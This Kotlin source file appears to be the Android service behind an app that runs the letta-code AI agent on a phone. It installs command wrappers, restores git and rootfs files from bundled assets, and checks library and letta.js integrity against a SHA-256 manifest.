        // here — the manifest pass above owns them (always rewritten from
        // their APK assets, sha256-verified against the manifest).
        log("files/libs populated: ${filesLibs.listFiles()?.size} files")

        val binDir = File(filesDir, "bin")
        binDir.mkdirs()
        val bash = File(binDir, "bash")
        bash.writeText("#!/system/bin/sh\nexec $loaderFlag ${File(libDir, "libguestbash.so").absolutePath} \"$@\"\n")
        bash.setExecutable(true, false)
        log("bash wrapper installed")

        // `letta` wrapper: launcher for letta-code itself. Subagent spawning and
        // `letta` CLI re-invocations (LETTA_CODE_BIN) need a spawnable entry
        // point; process.execPath is the loader chain (cannot be re-spawned raw)
        // and letta.js is not directly executable on Android. Route through the
        // same loader chain the server itself runs under, with the same env the
        // launch script exports (self-contained: some spawn paths scrub env).
        val lettaJsPath = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/letta.js").absolutePath
        val lettaBin = File(binDir, "letta")
        lettaBin.writeText(
            "#!/system/bin/sh\n" +
            "export HOME=\"\${HOME:-${File(rootfsDir, "root").absolutePath}}\"\n" +
            "export TMPDIR=\"\${TMPDIR:-${File(rootfsDir, "tmp").absolutePath}}\"\n" +
            "export PATH=${binDir.absolutePath}:/system/bin:/system/xbin\n" +
            "export NODE_OPTIONS=\"--require ${File(filesDir, "dns-shim.js").absolutePath}\"\n" +
            "export UV_USE_IO_URING=0\n" +
            "exec $loaderFlag ${File(libDir, "libnode.so").absolutePath} \"$lettaJsPath\" \"$@\"\n"
        )
        lettaBin.setExecutable(true, false)
        log("letta wrapper installed")

        // `node` wrapper (Sep 28): letta.js's memory git hooks (pre-commit
        // constraints validator, .cjs) invoke `node` from PATH. Spawned hook
        // processes have no node otherwise — process.execPath is the loader
        // chain and cannot be re-spawned raw. Same pattern as the letta
        // wrapper but exec'ing arbitrary JS args (node script.cjs ...).
        val nodeBin = File(binDir, "node")
        nodeBin.writeText(
            "#!/system/bin/sh\n" +
            "export HOME=\"\${HOME:-${File(rootfsDir, "root").absolutePath}}\"\n" +
            "export TMPDIR=\"\${TMPDIR:-${File(rootfsDir, "tmp").absolutePath}}\"\n" +
            "export PATH=${binDir.absolutePath}:/system/bin:/system/xbin\n" +
            "export UV_USE_IO_URING=0\n" +
            "exec $loaderFlag ${File(libDir, "libnode.so").absolutePath} \"$@\"\n"
        )
        nodeBin.setExecutable(true, false)
        log("node wrapper installed")

        // dx: agent-facing wrapper for running commands inside the proot
        // rootfs (apt, git, …) plus Android system tools via the /system
        // bind-mount (pm, am, settings). Source of truth: tools/on-device/dx.sh
        // — keep in sync. Always rewrite: the script embeds no absolute
        // per-install paths (DX_FILES auto-detects) but refresh keeps it
        // current when the asset ships updates.
        val dx = File(binDir, "dx")
        assets.open("dx.sh").use { input ->
            dx.outputStream().use { output -> input.copyTo(output) }
        }
        dx.setExecutable(true, false)
        log("dx wrapper installed")

        // git: letta-code 0.32.x requires a spawnable `git` on PATH for
        // git-based MemFS sync. The rootfs never shipped git, so every turn
        // died with "spawn git ENOENT". PRIMARY: static ELF chain (git-elf +
        // gc-shim + dnsport.so) — proot cannot exec from loader-chain
        // processes (interpreter ENOENT), so the old proot wrapper failed
        // for every memfs clone. FALLBACK: proot rootfs for contexts that
        // can run it. Source of truth: app/src/main/assets/git.sh — keep in
        // sync with the asset. Always rewrite, same policy as dx above.
        val git = File(binDir, "git")
        assets.open("git.sh").use { input ->
            git.outputStream().use { output -> input.copyTo(output) }
        }
        git.setExecutable(true, false)
        log("git wrapper installed")

        // git-elf + gc-shim: static ELF git chain (Sep 28).
        // git-elf exec's the rootfs glibc loader with real git and
        // --preload dnsport.so (getaddrinfo override → local DNS forwarder).
        // gc-shim holds static ELF shims for git's dashed-dispatch child
        // spawns (git, git-remote-{http,https,ftp,ftps}) — raw glibc
        // git-core binaries ENOEXEC on Android (no interpreter). Sources:
        // tools/watch-git-shims/. Always rewrite (assets are immutable).
        val gitElf = File(binDir, "git-elf")
        assets.open("git-elf").use { input ->
            gitElf.outputStream().use { output -> input.copyTo(output) }
        }
        gitElf.setExecutable(true, false)
        val gcShimDir = File(filesDir, "gc-shim")
        gcShimDir.mkdirs()
        for (name in listOf("git", "git-remote-ftp", "git-remote-ftps", "git-remote-http", "git-remote-https")) {
            val shim = File(gcShimDir, name)
            assets.open("gc-shim/$name").use { input ->
                shim.outputStream().use { output -> input.copyTo(output) }
            }
            shim.setExecutable(true, false)
        }
        // dnsport.so and dns-forwarder.js now install via the integrity
        // manifest pass (sha256 verified against the APK asset) — see the
        // manifest loop above. (dns-forwarder.js joined the manifest in the
        // Oct 8 set-3 follow-up: it was previously copied unverified.)
        log("git ELF chain installed (git-elf, gc-shim, dnsport.so, dns-forwarder.js)")


        // agentctl: agent-side client for the accessibility command channel
        // (tap/swipe/text/screen-tree) + am/pm/notify passthroughs. Always
        // rewrite — same policy as dx. Source: app/src/main/assets/agentctl.sh.
        val agentctl = File(binDir, "agentctl")
        assets.open("agentctl.sh").use { input ->
            agentctl.outputStream().use { output -> input.copyTo(output) }
        }
        agentctl.setExecutable(true, false)
        log("agentctl installed")

        // git payload tarballs staged to the filesDir ROOT under their exact
        // asset names — the wrapper looks for $FILES/git-arm64.tar.gz and
        // $FILES/proot-aarch64.tar.gz (offline first-run install; falls back
        // to the GitHub plugins-v1 release URLs when absent). proot is staged
        // too so the wrapper shares dx's plugin install without a download.
        // Large (31.5MB git payload): copy once per install, like rootfs.tar.
        // Partial-copy self-heal: rootfs uses a marker+verify pattern for the
        // same class of problem; here a size check is enough (assets are
        // immutable, so length mismatch = interrupted copy). Rewrite from the
        // asset on mismatch — no manual cleanup path needed.
        for (payloadName in listOf("git-arm64.tar.gz", "proot-aarch64.tar.gz")) {
            val payload = File(filesDir, payloadName)
            val assetSize = assets.open(payloadName).use { it.available().toLong() }
            if (!payload.exists() || payload.length() != assetSize) {
                if (payload.exists()) payload.delete()
                assets.open(payloadName).use { input ->
                    payload.outputStream().use { output -> input.copyTo(output, 1 shl 20) }
                }
                log("$payloadName staged to filesDir (${assetSize} bytes)")
            }
        }

        // git payload resilience (Oct 7): git-elf execs rootfs/usr/bin/git as
        // a GLIBC PROGRAM (loader invocation) — it must be the real Debian
        // ELF, never a shell script, and never absent. Three observed failure
        // shapes: (a) stale v0.2.7-era ELF (wrong glibc, cannot load);
        // (b) payload missing entirely after reinstall (rootfs.tar does not
        // carry usr/bin/git — the payload asset does); (c) a wrapper script
        // left at the path by a field hotfix breaks git-elf with "invalid
        // ELF header". The harness's shared-memory sync execs git by this
        // ABSOLUTE path, so any bad state here gates ALL Bash/Monitor calls
        // in on-device sessions. Restore the payload whenever the path is
        // missing or not a real ELF: staged tarball first (offline-safe).
        val rootfsGit = File(rootfsDir, "usr/bin/git")
        runCatching {
            val needsRestore = !rootfsGit.exists() || rootfsGit.inputStream().use {
                // ELF magic check: 0x7F 'E' 'L' 'F'. A #! wrapper or zero-byte
                // file fails this and gets restored.
                val magic = ByteArray(4)
                it.read(magic) == 4 && magic[0] == 0x7F.toByte() &&
                    magic[1] == 'E'.code.toByte() && magic[2] == 'L'.code.toByte() && magic[3] == 'F'.code.toByte()
            }.not()
            if (needsRestore) {
                val tarball = File(filesDir, "git-arm64.tar.gz")
                if (tarball.exists()) {
                    val p = ProcessBuilder("tar", "-xzf", tarball.absolutePath, "-C", rootfsDir.absolutePath)
                        .redirectErrorStream(true).start()
                    val out = p.inputStream.bufferedReader().readText()
                    val rc = p.waitFor()
                    if (rc == 0 && rootfsGit.exists()) {
                        log("git payload restored from staged tarball (was: missing or non-ELF)")
                    } else {
                        log("git payload tarball extract failed (rc=$rc): ${out.take(200)}")
                    }
                } else {
                    log("git payload needs restore but no staged tarball — wrapper self-heal will download")
                }
            }
        }.onFailure { log("git payload resilience check failed: ${it.message}") }

        // ripgrep is statically linked (musl) — execve from app_data works as-is.

        // native addons: symlink into libdir (dlopen'd with PROT_EXEC)
        val nmRoot = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/node_modules")
        val linkTargets = listOf(
            File(nmRoot, "node-pty/build/Release/pty.node"),
            File(nmRoot, "@img/sharp-linux-arm64/lib/sharp-linux-arm64.node"),
            File(nmRoot, "@img/sharp-libvips-linux-arm64/lib/libvips-cpp.so.8.17.3")
        )
        for (t in linkTargets) {
            try {
                val libCopy = File(File(filesDir, "libs"), t.name)
                if (libCopy.exists() && t.exists() && !Files.isSymbolicLink(t.toPath())) {
                    t.delete()
                    Files.createSymbolicLink(t.toPath(), libCopy.toPath())
                    log("linked ${t.name} -> libdir")
                }
            } catch (e: Exception) {
                log("WARN: link failed for ${t.name}: ${e.message}")
            }
        }
    }

    /**
     * Read + parse the integrity manifest FROM THE APK ASSET (authority).
     * Also writes a diagnostics copy to filesDir/integrity-manifest.txt —
     * on-device agents can cat it to see what integrity is enforced; the
     * copy is NEVER parsed for decisions (review 2731: the filesDir tree
     * is attacker-writable).
     */
    private fun readIntegrityManifest(): List<ManifestEntry> {
        val text = runCatching { assets.open("integrity-manifest.txt").bufferedReader().use { it.readText() } }
            .getOrElse { e ->
                log("integrity manifest asset read failed: ${e.message}")
                return emptyList()
            }
        runCatching {
            File(filesDir, "integrity-manifest.txt").writeText(text)
        }
        return parseIntegrityManifest(text)
    }

    /**
     * Extract one member from the APK's rootfs.tar asset directly to dst
     * (streamed; the 194MB tarball is never fully extracted). Restores
     * authority bytes for rootfs-sourced libs WITHOUT trusting the on-disk
     * rootfs cache. Member names inside rootfs.tar carry the "./" prefix;
     * callers pass "./usr/lib/..." style names (see ManifestEntry).
     */
    /**
     * Extract multiple members from the APK's rootfs.tar asset in ONE
     * stream pass (the 194MB tarball is decompressed once regardless of
     * how many entries need restore). Restores authority bytes for
     * rootfs-sourced libs WITHOUT trusting the on-disk rootfs cache.
     * Member names inside rootfs.tar carry the "./" prefix; callers pass
     * "./usr/lib/..." style names. Returns dst -> extracted-ok; entries
     * never found in the archive map to false (caller decides policy).
     *
     * Raw tar header scan (512-byte blocks, GNU long-name 'L' support) —
     * flat memory regardless of member position. Writes go through
     * temp-file + rename so a crash mid-extract never leaves a truncated
     * lib in the loader search path.
     */
    private fun extractRootfsTarMembers(wanted: Map<File, String>): Map<File, Boolean> {
        val result = wanted.keys.associateWith { false }.toMutableMap()
        if (wanted.isEmpty()) return result
        val remaining = HashMap<String, File>() // member -> dst (removed as found)
        for ((dstF, member) in wanted) remaining[member] = dstF
        val outBuf = ByteArray(64 * 1024)
        runCatching {
            assets.open("rootfs.tar").use { ain ->
                GZIPInputStream(ain, 1 shl 16).use { gz ->
                    val header = ByteArray(512)
                    val nameField = ByteArray(100)
                    val sizeField = ByteArray(12)
                    while (true) {
                        var off = 0
                        while (off < 512) {
                            val n = gz.read(header, off, 512 - off)
                            if (n < 0) return@runCatching
                            off += n
                        }
                        if (header.all { it == 0.toByte() }) return@runCatching // end-of-archive
                        System.arraycopy(header, 0, nameField, 0, 100)
                        System.arraycopy(header, 124, sizeField, 0, 12)
                        var name = String(nameField).trimEnd('\u0000')
                        // GNU long-name member (type 'L') carries the real name in its data.
                        if (header[156] == 'L'.code.toByte()) {
                            val lsize = parseTarOctal(sizeField)
                            val ldata = ByteArray(lsize.toInt())
                            var lo = 0
                            while (lo < lsize.toInt()) {
                                val n = gz.read(ldata, lo, (lsize - lo).toInt())
                                if (n < 0) return@runCatching
                                lo += n
                            }
                            name = String(ldata).trimEnd('\u0000', '\n')
                            skipTarPadding(gz, lsize)
                            // Next 512-block is the real header for that name.
                            off = 0
                            while (off < 512) {
                                val n = gz.read(header, off, 512 - off)
                                if (n < 0) return@runCatching
                                off += n
                            }
                            System.arraycopy(header, 124, sizeField, 0, 12)
                        }
                        val size = parseTarOctal(sizeField)
                        val dst = remaining.remove(name)
                        if (dst != null) {
                            // Write payload through a temp file + rename so a
                            // crash mid-extract never leaves a truncated lib
                            // in the loader search path.
                            val tmp = File(dst.absolutePath + ".tmp-restore")
                            var ok = true
                            runCatching {
                                tmp.outputStream().use { out ->
                                    var rem = size
                                    while (rem > 0) {
                                        val n = gz.read(outBuf, 0, minOf(outBuf.size.toLong(), rem).toInt())
                                        if (n < 0) return@runCatching
                                        out.write(outBuf, 0, n)
                                        rem -= n
                                    }
                                }
                            }.onFailure { ok = false }
                            if (ok && !dst.parentFile!!.exists()) dst.parentFile!!.mkdirs()
                            if (ok) {
                                if (dst.exists()) dst.delete()
                                if (!tmp.renameTo(dst)) {
                                    runCatching { tmp.copyTo(dst, overwrite = true) }
                                        .onFailure { ok = false }
                                    tmp.delete()
                                }
                            } else {
                                tmp.delete()
                                // Mid-member read failure: stream position is
                                // unrecoverable — abort the whole scan; other
                                // wanted entries map to false (caller logs).
                                return@runCatching
                            }
                            if (ok) {
                                result[dst] = true
                                if (remaining.isEmpty()) return@runCatching
                            }
                            continue // payload fully consumed by the extract above
                        }
                        skipTarPayload(gz, size)
                    }
                }
            }
        }
        return result
    }

    private fun parseTarOctal(field: ByteArray): Long {
        // octal ASCII, possibly NUL/space-padded
        var i = 0
        while (i < field.size && (field[i] == ' '.code.toByte() || field[i] == 0.toByte())) i++
        var v = 0L
        while (i < field.size) {
            val c = field[i]
            if (c == 0.toByte() || c == ' '.code.toByte()) break
            if (c < '0'.code.toByte() || c > '7'.code.toByte()) break
            v = (v shl 3) or (c - '0'.code.toByte()).toLong()
            i++
        }
        return v
    }

    private fun skipTarPayload(gz: java.io.InputStream, size: Long) {
        var remaining = size + ((512 - (size % 512)) % 512)
        while (remaining > 0) {
            val n = gz.skip(remaining)
            if (n > 0) { remaining -= n; continue }
            // skip() returned 0 without consuming — force progress or die.
            if (gz.read() < 0) return
            remaining -= 1
        }
    }

    private fun skipTarPadding(gz: java.io.InputStream, size: Long) {
        val pad = ((512 - (size % 512)) % 512)
        var remaining = pad
        while (remaining > 0) {
            val n = gz.skip(remaining)
            if (n > 0) { remaining -= n; continue }
            if (gz.read() < 0) return
            remaining -= 1
        }
    }

    /**
     * Post-restore integrity gate (review 2731). Returns null = pass, or a
     * (status, notification, logDetail) triple describing the block reason.
     * The expected set and every hash come from the APK-asset manifest —
     * nothing is hard-coded here. Runs AFTER installSupportFiles' restore
     * pass, so any remaining failure is in-session tampering or a restore
     * defect, both launch-blocking.
     */
    private fun integrityGate(): Triple<String, String, String>? {
        val filesLibsDir = File(filesDir, "libs")
        if (!filesLibsDir.isDirectory) return null // nothing installed yet — restore pass creates it
        val manifest = readIntegrityManifest()
        if (manifest.isEmpty()) {
            return Triple(
                "integrity check failed — manifest missing",
                "Integrity: manifest unreadable",
                "integrity manifest unparseable from APK assets — build defect.",
            )
        }
        val libsEntries = manifest.filter { it.dest.startsWith("libs/") }
        val byBase = libsEntries.associateBy { it.destFileBase }
        val present = filesLibsDir.listFiles()?.map { it.name }.orEmpty()
        val foreign = present.filter { it !in byBase.keys }
        if (foreign.isNotEmpty()) {
            foreign.forEach { File(filesLibsDir, it).delete() }
            return Triple(
                "integrity check failed — unexpected files in libs",
                "Integrity: foreign files removed",
                "foreign files in files/libs (planted?): $foreign — removed. A hostile agent turn may have attempted a preload implant.",
            )
        }
        val missingRequired = libsEntries.filter { !it.optional && !File(filesLibsDir, it.destFileBase).exists() }
        if (missingRequired.isNotEmpty()) {
            return Triple(
                "integrity check failed — missing libs",
                "Integrity: required lib missing",
                "required manifest entries absent after restore: ${missingRequired.map { it.destFileBase }} — restore failed.",
            )
        }
        for (name in present) {
            val e = byBase[name] ?: continue
            if (sha256Of(File(filesLibsDir, name)) != e.sha256) {
                return Triple(
                    "integrity check failed — $name modified",
                    "Integrity: $name mismatch",
                    "$name in files/libs fails manifest sha256 AFTER restore pass — active tampering within session.",
                )
            }
        }
        return null
    }

    /**
     * letta.js PRE-PATCH pin (Oct 8 set-3 follow-up, per review discussion).
     *
     * The pin target is the letta.js member bytes AS EXTRACTED from the
     * pinned rootfs.tar — applyLettaJsPatches rewrites the file afterwards,
     * so post-patch bytes legitimately differ from the pin. Ordering is
     * gate-then-patch: this check runs BEFORE any patching.
     *
     * Version scoping: npm upgrades legitimately replace letta.js with
     * unpinned bytes (set-3's exact-pin + version-assert owns that path).
     * The pin applies ONLY while the installed package version equals the
     * manifest's pin-version header. While it applies:
     *   - missing file            → restore from the rootfs.tar member
     *   - hash mismatch           → restore from the rootfs.tar member
     *                               (rollback of in-place tampering; a legit
     *                               upgrade would have bumped the version)
     *   - restore fails           → BLOCK boot (fail-closed)
     * Returns false = boot must be blocked.
     */
    private fun verifyLettaJsPin(rootfsDir: File, manifestText: String): Boolean {
        val entries = parseIntegrityManifest(manifestText)
        val entry = entries.firstOrNull { it.dest == "npm/letta.js" } ?: run {
            log("PATCH-PIN: no npm/letta.js manifest entry (old manifest?) — pin inactive")
            return true
        }
        val pinVersion = parseManifestPinVersion(manifestText)
        if (pinVersion == null) {
            log("PATCH-PIN: manifest has letta.js entry but no pin-version header — pin inactive (generator regen needed)")
            return true
        }
        val installedPkg = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/package.json")
        val installedV = runCatching {
            org.json.JSONObject(installedPkg.readText()).optString("version", "")
        }.getOrDefault("")
        if (installedV != pinVersion && installedV.isNotEmpty()) {
            // Upgraded install — letta.js is not the pinned build's bytes.
            // Tamper protection for upgraded copies is post-install only;
            // the npm chain (set 3) owns install-time integrity.
            log("PATCH-PIN: installed $installedV != pin-version $pinVersion — pin not applied (upgraded install)")
            return true
        }
        if (installedV.isEmpty()) {
            // package.json missing/corrupt: an authority install ALWAYS has a
            // readable version — unreadable means tamper or corruption, and
            // treating it as "upgraded" would let a corrupted package.json
            // deactivate the pin while a tampered letta.js boots. Enforce.
            log("PATCH-PIN: installed version unreadable — enforcing pin (fail-closed)")
        }
        val lettaJs = File(rootfsDir, "usr/local/lib/node_modules/@letta-ai/letta-code/letta.js")
        val actual = runCatching { sha256Of(lettaJs) }.getOrDefault("")
        if (actual != entry.sha256) {
            log("PATCH-PIN: letta.js ${if (lettaJs.exists()) "hash mismatch" else "missing"} on pinned install — " +
                "restoring authority bytes (in-place tamper or stale patch state)")
            val ok = extractRootfsTarMembers(mapOf(lettaJs to ("./" + (entry.member ?: entry.source.removePrefix("rootfs:")))))[lettaJs] == true &&
                sha256Of(lettaJs) == entry.sha256
            if (!ok) {
                log("SECURITY: PATCH-PIN restore failed or restored bytes still wrong — blocking boot")
                return false
            }
            log("PATCH-PIN: authority bytes restored")
            return true
        }
        log("PATCH-PIN: letta.js pre-patch pin verified ($actual)")
        return true
    }

    /**
     * Delete listener locks whose owning process is gone. The letta.js lock
     * (writeFileSync wx) assumes clean shutdown; Android kills the whole
     * process tree on force-stop/OOM/reboot without cleanup, and every
     * subsequent start then fails with "already running (pid N)". A lock is
     * stale when its pid is not running, or is running but is not one of our
     * libldlnx/letta processes (pid recycled to an unrelated app — cmdline
     * only reads back for same-uid processes, so unreadable also means not ours).
     */
    private fun sweepStaleListenerLocks(rootfsDir: File) {
        val listeners = File(rootfsDir, "root/.letta/listeners")
        val locks = listeners.listFiles { f -> f.name.endsWith(".lock") } ?: return
        for (lock in locks) {
            try {
                val text = lock.readText()
                val pid = Regex("\"pid\"\\s*:\\s*(\\d+)").find(text)?.groupValues?.get(1)
                if (pid.isNullOrEmpty()) {
                    log("Lock sweep: ${lock.name} has no pid — leaving it (manual review)")
                    continue
                }
                val procDir = File("/proc/$pid")
                val alive = procDir.isDirectory
                val ours = alive && runCatching {
                    val cmdline = File(procDir, "cmdline").readText()
                    cmdline.contains("libldlnx") || cmdline.contains("letta")
                }.getOrDefault(false)
                if (alive && ours) continue
                val reason = if (!alive) "pid $pid not running" else "pid $pid not our process"
                if (lock.delete()) log("Lock sweep: removed stale ${lock.name} ($reason)")
                else log("Lock sweep: FAILED to delete ${lock.name} ($reason)")
            } catch (e: Exception) {
                log("Lock sweep: error on ${lock.name}: ${e.message}")
            }
        }
    }

    private fun log(msg: String) {
        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        File(filesDir, "server.log").appendText("[$ts] $msg\n")
    }

    private fun setStatus(s: String) {
        File(filesDir, "status.txt").writeText("env=${envName()}\nstate=$s\n")
    }

    private fun createChannel() {
        val nm = getSystemService(NotificationManager::class.java)
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Environment Status",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Persistent notification shown while the Agents Beamdown environment is running on this device"
            setShowBadge(false)
        }
        nm.createNotificationChannel(channel)
        // Agent alerts (agentctl notify): heads-up, makes noise — this is the
        // channel the agent uses to reach the human from the environment.
        val alerts = NotificationChannel(
            "letta-env-agent-alerts",
            "Agent Alerts",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Messages the agent sends you from the environment (agentctl notify)"
        }
        nm.createNotificationChannel(alerts)
        // App-update reminders (v0.4.5): visible channel users can disable at
        // the OS level for update notifications. Created here too so it shows
        // in system settings from boot (UpdateManager.createNotifChannel is
        // idempotent and creates it lazily as well).
        UpdateManager.createNotifChannel(this)
        // Remove the pre-v0.2.3 generic channel so it does not linger in system settings.
        nm.deleteNotificationChannel("letta-env")
    }

    /** Post an agent-originated alert (from agentctl notify via broadcast). */
    private fun postAgentAlert(title: String, text: String) {
        val nm = getSystemService(NotificationManager::class.java)
        val n = android.app.Notification.Builder(this, "letta-env-agent-alerts")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(text)
            .setStyle(android.app.Notification.BigTextStyle().bigText(text))
            .setAutoCancel(true)
            .setContentIntent(contentIntent())
            .build()
        nm.notify(7000 + (System.currentTimeMillis() % 1000).toInt(), n)
    }

    private fun contentIntent(): PendingIntent {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val flags = if (Build.VERSION.SDK_INT >= 23) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        return PendingIntent.getActivity(this, 0, intent, flags)
    }

    private fun buildNotification(text: String): Notification {
        // Use the launcher icon as the large icon so the notification is recognisable.
        val largeIcon = try {
            BitmapFactory.decodeResource(resources, R.mipmap.ic_launcher)
        } catch (_: Exception) {
            null
        }
        // Indefinite runners never stop the server, so the idle-only update
        // card never shows for them. Surface the known update in the ONE
        // surface they always see: this persistent status notification.
        // The 30-min feed tick discovers the tag; onUpdateAvailable
        // re-renders; every buildNotification call reads the pref so all
        // statuses carry it (Online/Running/Starting/stopped-transition).
        val updateTag = getSharedPreferences(PREFS, MODE_PRIVATE)
            .getString("update_tag", null)
        // Skip the suffix on letta-code upgrade statuses — those lines
        // describe the OTHER update path (npm package, not the APK) and
        // "stop to update" instruction-mash there is misleading.
        val upgrading = text.contains("pgrad", ignoreCase = true)
        val shownText = if (updateTag.isNullOrEmpty() || upgrading) text
            else "$text  ·  $updateTag available — stop to update"
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Agents Beamdown — ${envName()}")
            .setContentText(shownText)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setLargeIcon(largeIcon)
            .setOngoing(true)
            .setContentIntent(contentIntent())
            .setOnlyAlertOnce(true)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .build()
    }

    // Last status text rendered into the notification — lets the update
    // discovery callback re-render the SAME status with the update suffix
    // (or without, on clear) without knowing which status line is current.
    private var lastNotifText: String = "Starting..."

    private fun updateNotification(text: String) {
        lastNotifText = text
        val nm = getSystemService(NotificationManager::class.java)
        nm.notify(NOTIFICATION_ID, buildNotification(text))
    }

    /** Re-post the notification with the current status line (pref-read in
     *  buildNotification picks up or drops the update suffix). Already
     *  main-thread (callback posts to main looper). */
    private fun rerenderNotification() {
        runCatching {
            val nm = getSystemService(NotificationManager::class.java)
            nm.notify(NOTIFICATION_ID, buildNotification(lastNotifText))
        }
    }

    override fun onDestroy() {
        UpdateManager.onStatusRerender = null
        // Review #18 F2/F3 (Angus): Stop must be terminal. Set SHUTDOWN FIRST
        // so the worker's drain loop cannot relaunch. onDestroy also runs for
        // install-kills and system shutdowns — the user-stop MARKER is only
        // written by ACTION_STOP_EXPLICIT (the Stop button), so those paths
        // don't masquerade as user stops.
        pendingOp.set(PendingOp.SHUTDOWN)
        lifecycle.set(State.STOPPING)
        if (lifecycle.get() != State.STOPPING) setStatus("stopped")
        try { proc?.destroy() } catch (_: Exception) {}
        worker?.interrupt() // advisory: waitFor is not interruptible
        super.onDestroy()
    }
}
